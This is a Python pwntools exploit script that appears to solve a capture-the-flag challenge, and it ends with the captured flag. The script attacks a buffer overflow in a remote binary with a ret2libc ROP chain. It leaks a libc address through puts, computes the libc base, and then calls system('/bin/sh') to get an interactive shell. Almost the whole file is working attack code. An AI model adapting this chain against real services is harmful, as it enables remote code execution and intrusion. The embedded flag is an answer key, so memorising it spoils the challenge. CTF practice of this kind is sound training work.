from pwn import *

# init things
context.binary = binary = "./main"
elf = ELF(binary)
libc = ELF("./libc.so.6")
rop = ROP(elf)

# 1st step: leak libc base address
payload = b'A'*70 + b"*\0" # padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0]) # finding gadget to call puts
payload += p64(elf.got.fgets) # the address will be leaked
payload += p64(elf.plt.puts) # function will be called
payload += p64(0x004011ee) # return to main

#p = process()
p = remote("ctf.csd.lol", 2020)
p.recvuntil(b"vault: ")
p.sendline(payload)
fgets_leak = u64(p.recvuntil(b"vault: ").splitlines()[0].split(b"*")[1].ljust(8, b"\0"))
print(f"Leaked fgets: {hex(fgets_leak)}")

libc.address = fgets_leak - libc.symbols.fgets
print(f"Leaked libc base: {hex(libc.address)}")

# 2nd step: execute system()
payload = b'A'*72
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)


p.sendline(payload)
p.recv()
p.interactive()

# csd{J1Ngl3_b3ll_r0CK_15_b357_XM45_50NG}